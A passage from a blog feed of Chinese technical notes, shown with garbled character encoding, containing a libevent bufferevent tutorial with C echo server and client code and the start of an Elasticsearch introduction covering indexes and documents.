title="æœåŠ¡ç«¯buffereventåˆ›å»ºTCPè¿æ¥æµç¨‹"></a>æœåŠ¡ç«¯buffereventåˆ›å»ºTCPè¿æ¥æµç¨‹</h4><ul><li>åˆ›å»º<code>event_base</code></li><li>åˆ›å»ºæœåŠ¡å™¨è¿æ¥ç›‘å¬å™¨<code>evconnlistener_new_bind()</code></li><li>åœ¨<code>evconnlistener_new_bind()</code>çš„å›è°ƒå‡½æ•°ä¸­ï¼Œå¤„ç†æ¥å—è¿æ¥åçš„æ“ä½œ</li><li>å›è°ƒå‡½æ•°è¢«è°ƒç”¨ï¼Œè¯´æ˜æœ‰ä¸€ä¸ªæ–°çš„å®¢æˆ·ç«¯è¿æ¥ï¼Œä¼šå¾—åˆ°ä¸€ä¸ªæ–°çš„fdï¼Œç”¨äºå’Œå®¢æˆ·ç«¯è¿›è¡Œé€šä¿¡</li><li>åˆ›å»º<code>bufferevent</code>äº‹ä»¶å¯¹è±¡ï¼Œ<code>bufferevent_socket_new()</code>ï¼Œå°†fdå°è£…åˆ°è¿™ä¸ªäº‹ä»¶å¯¹è±¡ä¸­</li><li>ä½¿ç”¨<code>bufferevent_setcb()</code>å‡½æ•°ç»™<code>bufferevent</code>çš„<code>readã€writeã€event</code>è®¾ç½®å›è°ƒå‡½æ•°</li><li>è®¾ç½®è¯»ç¼“å†²ã€å†™ç¼“å†²çš„ä½¿èƒ½çŠ¶æ€ <code>enableã€disable</code></li><li>æ¥å—ã€å‘é€æ•°æ®<code>bufferevent_read()/bufferevent_write()</code></li><li>å¯åŠ¨å¾ªç¯<code>event_base_dispatch()</code></li><li>é‡Šæ”¾èµ„æº</li></ul><h4 id="æœåŠ¡ç«¯buffereventå®ç°"><a href="#æœåŠ¡ç«¯buffereventå®ç°" class="headerlink" title="æœåŠ¡ç«¯buffereventå®ç°"></a>æœåŠ¡ç«¯buffereventå®ç°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/event.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/listener.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/bufferevent.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//è¯»ç¼“å†²åŒºå›è°ƒ</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_cb</span><span class="params">(struct bufferevent *bev,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">bufferevent_read(bev,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"client say : %s\n"</span>,buf);</span><br><span class="line"><span class="keyword">char</span> *p = <span class="string">"æˆ‘æ˜¯æœåŠ¡å™¨ï¼Œå·²ç»æˆåŠŸæ”¶åˆ°ä½ å‘é€çš„æ•°æ®ï¼"</span>;</span><br><span class="line">bufferevent_write(bev,p,<span class="built_in">strlen</span>(p)+<span class="number">1</span>);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å†™ç¼“å†²åŒºå›è°ƒ</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_cb</span><span class="params">(struct bufferevent *bev,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"æˆ‘æ˜¯æœåŠ¡å™¨çš„å†™å›è°ƒå‡½æ•°...\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//äº‹ä»¶å›è°ƒ</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">event_cb</span><span class="params">(struct bufferevent *bev,short events,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (events &amp; BEV_EVENT_EOF)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"connection close\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(events &amp; BEV_EVENT_ERROR)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"some other error\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">bufferevent_free(bev);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"buffeventèµ„æºå·²ç»è¢«é‡Šæ”¾...\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç›‘å¬å›è°ƒ</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cb_listener</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">struct evconnlistener *listener,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">evutil_socket_t</span> fd,</span></span></span><br><span class="line"><span class="function"><span class="params">struct sockaddr *addr,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">int</span> len,<span class="keyword">void</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"connect new client\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> = (<span class="title">struct</span> <span class="title">event_base</span>*)<span class="title">ptr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ·»åŠ æ–°äº‹ä»¶</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bufferevent</span> *<span class="title">bev</span>;</span></span><br><span class="line">bev = bufferevent_socket_new(base,fd,BEV_OPT_CLOSE_ON_FREE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç»™buffereventç¼“å†²åŒºè®¾ç½®å›è°ƒ</span></span><br><span class="line">bufferevent_setcb(bev,read_cb,write_cb,event_cb,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯ç”¨buffereventçš„è¯»ç¼“å†²</span></span><br><span class="line">bufferevent_enable(bev,EV_READ);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">const</span> <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv</span>;</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;serv,<span class="number">0</span>,<span class="keyword">sizeof</span>(serv));</span><br><span class="line">serv.sin_family = AF_INET;</span><br><span class="line">serv.sin_port = htons(<span class="number">9527</span>);</span><br><span class="line">serv.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ›å»ºevent_base</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span>;</span></span><br><span class="line">base = event_base_new();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">evconnlistener</span> *<span class="title">listener</span>;</span> <span class="comment">//ç›‘å¬å™¨</span></span><br><span class="line"><span class="comment">//åˆ›å»ºå¥—æ¥å­—ï¼Œç»‘å®šï¼Œæ¥æ”¶è¿æ¥è¯·æ±‚</span></span><br><span class="line">listener = evconnlistener_new_bind(base,cb_listener,base,LEV_OPT_CLOSE_ON_FREE | LEV_OPT_REUSEABLE,<span class="number">36</span>,(struct sockaddr*)&amp;serv,<span class="keyword">sizeof</span>(serv));</span><br><span class="line"></span><br><span class="line">event_base_dispatch(base);</span><br><span class="line">evconnlistener_free(listener);</span><br><span class="line">event_base_free(base);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc ev_server.c -o ev_server -l event</span><br></pre></td></tr></table></figure><h4 id="å®¢æˆ·ç«¯buffereventåˆ›å»ºTCPè¿æ¥æµç¨‹"><a href="#å®¢æˆ·ç«¯buffereventåˆ›å»ºTCPè¿æ¥æµç¨‹" class="headerlink" title="å®¢æˆ·ç«¯buffereventåˆ›å»ºTCPè¿æ¥æµç¨‹"></a>å®¢æˆ·ç«¯buffereventåˆ›å»ºTCPè¿æ¥æµç¨‹</h4><ul><li>åˆ›å»º<code>event_base</code></li><li>ä½¿ç”¨<code>bufferevent_socket_new()</code>åˆ›å»ºä¸€ä¸ªç”¨äºè·ŸæœåŠ¡å™¨é€šä¿¡çš„<code>bufferevent</code>äº‹ä»¶å¯¹è±¡</li><li>ä½¿ç”¨<code>bufferevent_socket_connect()</code>è¿æ¥æœåŠ¡å™¨</li><li>ä½¿ç”¨<code>bufferevent_setcb()</code>ç»™<code>bufferevent</code>å¯¹è±¡çš„<code>readã€writeã€event</code>è®¾ç½®å›è°ƒ</li><li>è®¾ç½®<code>bufferevent</code>å¯¹è±¡çš„è¯»å†™ç¼“å†²åŒº<code>enable/disable</code></li><li>æ¥å—ã€å‘é€æ•°æ®<code>bufferevent_read()/bufferevent_write()</code></li><li>å¯åŠ¨å¾ªç¯ç›‘å¬<code>event_base_dispatch()</code></li><li>é‡Šæ”¾èµ„æº</li></ul><h4 id="å®¢æˆ·ç«¯buffereventå®ç°"><a href="#å®¢æˆ·ç«¯buffereventå®ç°" class="headerlink" title="å®¢æˆ·ç«¯buffereventå®ç°"></a>å®¢æˆ·ç«¯buffereventå®ç°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/bufferevent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/event.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//è¯»ç¼“å†²åŒºå›è°ƒ</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_cb</span><span class="params">(struct bufferevent *bev,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">bufferevent_read(bev,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"server say : %s\n"</span>,buf);</span><br><span class="line">bufferevent_write(bev,buf,<span class="built_in">strlen</span>(buf)+<span class="number">1</span>);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_cb</span><span class="params">(struct bufferevent *bev,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"æˆ‘æ˜¯å®¢æˆ·ç«¯çš„å†™å›è°ƒå‡½æ•°....\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//äº‹ä»¶å›è°ƒ</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">event_cb</span><span class="params">(struct bufferevent *bev,short events,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (events &amp; BEV_EVENT_EOF)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"connection close\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(events &amp; BEV_EVENT_ERROR)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"some other error\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(events &amp; BEV_EVENT_CONNECTED)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"å·²ç»æˆåŠŸè¿æ¥åˆ°æœåŠ¡å™¨\n"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">bufferevent_free(bev);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"buffeventèµ„æºå·²ç»è¢«é‡Šæ”¾...\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_terminal</span><span class="params">(<span class="keyword">evutil_socket_t</span> fd,short what,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> len = read(fd,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bufferevent</span> *<span class="title">bev</span> = (<span class="title">struct</span> <span class="title">bufferevent</span>*)<span class="title">arg</span>;</span></span><br><span class="line"><span class="comment">//å‘é€æ•°æ®</span></span><br><span class="line">bufferevent_write(bev,buf,len+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> = <span class="title">NULL</span>;</span></span><br><span class="line">base = event_base_new();</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd = socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//é€šä¿¡çš„fdæ”¾åœ¨buffereventä¸­</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bufferevent</span> *<span class="title">bev</span> = <span class="title">NULL</span>;</span></span><br><span class="line">bev = bufferevent_socket_new(base,fd,BEV_OPT_CLOSE_ON_FREE);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv</span>;</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;serv,<span class="number">0</span>,<span class="keyword">sizeof</span>(serv));</span><br><span class="line">serv.sin_family = AF_INET;</span><br><span class="line">serv.sin_port = htons(<span class="number">9527</span>);</span><br><span class="line">inet_pton(AF_INET,<span class="string">"127.0.0.1"</span>,&amp;serv.sin_addr.s_addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿æ¥æœåŠ¡å™¨</span></span><br><span class="line">bufferevent_socket_connect(bev,(struct sockaddr*)&amp;serv,<span class="keyword">sizeof</span>(serv));</span><br><span class="line"></span><br><span class="line"><span class="comment">//è®¾ç½®å›è°ƒ</span></span><br><span class="line">bufferevent_setcb(bev,read_cb,write_cb,event_cb,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//è®¾ç½®è¯»å›è°ƒç”Ÿæ•ˆ</span></span><br><span class="line"><span class="comment">//bufferevent_enable(bev,EV_READ);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆ›å»ºäº‹ä»¶ï¼Œç›‘å¬ç”¨æˆ·åœ¨ç»ˆç«¯ä¸Šçš„è¾“å…¥</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event</span>* <span class="title">ev</span> = <span class="title">event_new</span>(<span class="title">base</span>,<span class="title">STDIN_FILENO</span>,<span class="title">EV_READ</span>|<span class="title">EV_PERSIST</span>,<span class="title">read_terminal</span>,<span class="title">bev</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ·»åŠ äº‹ä»¶</span></span><br><span class="line">event_add(ev,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">event_base_dispatch(base);</span><br><span class="line">event_free(ev);</span><br><span class="line">event_base_free(base);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc ev_client.c -o ev_client -l event</span><br></pre></td></tr></table></figure><h4 id="æœåŠ¡ç«¯å®¢æˆ·ç«¯æµ‹è¯•"><a href="#æœåŠ¡ç«¯å®¢æˆ·ç«¯æµ‹è¯•" class="headerlink" title="æœåŠ¡ç«¯å®¢æˆ·ç«¯æµ‹è¯•"></a>æœåŠ¡ç«¯å®¢æˆ·ç«¯æµ‹è¯•</h4><p><img src="/2021/11/19/æµ…å­¦libevent/7.png" alt="7"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;libeventç®€ä»‹&quot;&gt;&lt;a href=&quot;#libeventç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;libeventç®€ä»‹&quot;&gt;&lt;/a&gt;libeventç®€ä»‹&lt;/h4&gt;&lt;p&gt;&lt;code&gt;libevent&lt;/code&gt;æ˜¯ä¸€ä¸ªç”¨Cè¯­è¨€ç¼–å†™çš„è½»é‡çº§çš„å¼€æºé«˜
      
    
    </summary>
    
    
      <category term="Notes" scheme="elssm.github.io/tags/Notes/"/>
    
  </entry>
  
  <entry>
    <title>Elasticsearchç¬”è®°</title>
    <link href="elssm.github.io/2021/11/16/Elasticsearch%E7%AC%94%E8%AE%B0/"/>
    <id>elssm.github.io/2021/11/16/Elasticsearchç¬”è®°/</id>
    <published>2021-11-16T06:29:54.000Z</published>
    <updated>2021-12-13T09:45:04.378Z</updated>
    
    <content type="html"><![CDATA[<h4 id="ElasticSearchç®€ä»‹"><a href="#ElasticSearchç®€ä»‹" class="headerlink" title="ElasticSearchç®€ä»‹"></a>ElasticSearchç®€ä»‹</h4><p>Elasticsearchæ˜¯ä¸€ä¸ªåŸºäºLuceneçš„æœç´¢æœåŠ¡å™¨ã€‚å®ƒæä¾›äº†ä¸€ä¸ªåˆ†å¸ƒå¼å¤šç”¨æˆ·èƒ½åŠ›çš„å…¨æ–‡æœç´¢å¼•æ“ï¼ŒåŸºäºRESTful webæ¥å£ã€‚Elasticsearchæ˜¯ç”¨Javaè¯­è¨€å¼€å‘çš„ï¼Œå¹¶ä½œä¸ºApacheè®¸å¯æ¡æ¬¾ä¸‹çš„å¼€æ”¾æºç å‘å¸ƒï¼Œæ˜¯ä¸€ç§æµè¡Œçš„ä¼ä¸šçº§æœç´¢å¼•æ“ã€‚Elasticsearchç”¨äºäº‘è®¡ç®—ä¸­ï¼Œèƒ½å¤Ÿè¾¾åˆ°å®æ—¶æœç´¢ï¼Œç¨³å®šï¼Œå¯é ï¼Œå¿«é€Ÿï¼Œå®‰è£…ä½¿ç”¨æ–¹ä¾¿ã€‚å®˜æ–¹å®¢æˆ·ç«¯åœ¨Javaã€.NETï¼ˆC#ï¼‰ã€PHPã€Pythonã€Apache Groovyã€Rubyå’Œè®¸å¤šå…¶ä»–è¯­è¨€ä¸­éƒ½æ˜¯å¯ç”¨çš„ã€‚æ ¹æ®DB-Enginesçš„æ’åæ˜¾ç¤ºï¼ŒElasticsearchæ˜¯æœ€å—æ¬¢è¿çš„ä¼ä¸šæœç´¢å¼•æ“ï¼Œå…¶æ¬¡æ˜¯Apache Solrï¼Œä¹Ÿæ˜¯åŸºäºLuceneã€‚</p><h4 id="ElasticSearchå¯¹æ¯”MySQL"><a href="#ElasticSearchå¯¹æ¯”MySQL" class="headerlink" title="ElasticSearchå¯¹æ¯”MySQL"></a>ElasticSearchå¯¹æ¯”MySQL</h4><div class="table-container"><table><thead><tr><th>ELasticSearch</th><th>MySQL</th></tr></thead><tbody><tr><td>index</td><td>database</td></tr><tr><td>type</td><td>table</td></tr><tr><td>document</td><td>row</td></tr><tr><td>field</td><td>column</td></tr></tbody></table></div><h4 id="RESTful"><a href="#RESTful" class="headerlink" title="RESTful"></a>RESTful</h4><p>RESTfulä¸­æ–‡æ„æ€æ˜¯è¡¨ç°å±‚çŠ¶æ€è½¬åŒ–ã€‚</p><p>åœ¨RESTfulæ¶æ„ä¸­ï¼šæ¯ä¸€ä¸ªURIä»£è¡¨ä¸€ç§èµ„æºï¼›å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´ï¼Œä¼ é€’è¿™ç§èµ„æºçš„æŸç§è¡¨ç°å±‚ï¼›å®¢æˆ·ç«¯é€šè¿‡å››ä¸ªHTTPåŠ¨è¯ï¼Œå¯¹æœåŠ¡å™¨ç«¯èµ„æºè¿›è¡Œæ“ä½œï¼Œå®ç°â€è¡¨ç°å±‚çŠ¶æ€è½¬åŒ–â€ã€‚é€šè¿‡URIæŒ‡å®šèµ„æºï¼Œå¦‚<code>Indexï¼ŒDocument</code>ç­‰ã€‚é€šè¿‡<code>Http Method</code>æŒ‡æ˜èµ„æºæ“ä½œç±»å‹ï¼Œå¦‚<code>GET POST PUT DELETE</code>ç­‰ã€‚</p><h4 id="ç´¢å¼•åˆ›å»º"><a href="#ç´¢å¼•åˆ›å»º" class="headerlink" title="ç´¢å¼•åˆ›å»º"></a>ç´¢å¼•åˆ›å»º</h4><p>ä½¿ç”¨postmanå·¥å…·åˆ›å»ºä¸€ä¸ªåä¸º<code>shopping</code>çš„ç´¢å¼•ï¼Œè¯·æ±‚æ–¹å¼ä¸º<code>PUT</code></p><p><img src="/2021/11/16/Elasticsearchç¬”è®°/1.png" alt="1"></p><h4 id="ç´¢å¼•æŸ¥è¯¢"><a href="#ç´¢å¼•æŸ¥è¯¢" class="headerlink" title="ç´¢å¼•æŸ¥è¯¢"></a>ç´¢å¼•æŸ¥è¯¢</h4><h5 id="è·å–å•ä¸ªç´¢å¼•ä¿¡æ¯"><a href="#è·å–å•ä¸ªç´¢å¼•ä¿¡æ¯" class="headerlink" title="è·å–å•ä¸ªç´¢å¼•ä¿¡æ¯"></a>è·å–å•ä¸ªç´¢å¼•ä¿¡æ¯</h5><p><img src="/2021/11/16/Elasticsearchç¬”è®°/2.png" alt="2"></p><h5 id="è·å–å…¨éƒ¨ç´¢å¼•ä¿¡æ¯"><a href="#è·å–å…¨éƒ¨ç´¢å¼•ä¿¡æ¯" class="headerlink" title="è·å–å…¨éƒ¨ç´¢å¼•ä¿¡æ¯"></a>è·å–å…¨éƒ¨ç´¢å¼•ä¿¡æ¯</h5><p>è¯·æ±‚åœ°å€åé¢æ·»åŠ <code>_cat/indices?v</code></p><p><img src="/2021/11/16/Elasticsearchç¬”è®°/3.png" alt="3"></p><h4 id="ç´¢å¼•åˆ é™¤"><a href="#ç´¢å¼•åˆ é™¤" class="headerlink" title="ç´¢å¼•åˆ é™¤"></a>ç´¢å¼•åˆ é™¤</h4><p>åˆ é™¤åä¸º<code>shopping</code>çš„ç´¢å¼•ï¼Œè¯·æ±‚æ–¹å¼ä¸º<code>DELETE</code></p><p><img src="/2021/11/16/Elasticsearchç¬”è®°/4.png" alt="4"></p><h4 id="åˆ›å»ºæ–‡æ¡£"><a href="#åˆ›å»ºæ–‡æ¡£" class="headerlink" title="åˆ›å»ºæ–‡æ¡£"></a>åˆ›å»ºæ–‡æ¡£</h4><p>è¯·æ±‚æ–¹å¼ä¸º<code>POST</code>ï¼Œè¯·æ±‚åœ°å€ä¸º<code>http://localhost:9200/ç´¢å¼•å/_doc</code>ï¼Œè¯·æ±‚ä½“ä¸º<code>JSON</code>æ ¼å¼</p><p><img src="/2021/11/16/Elasticsearchç¬”è®°/5.png" 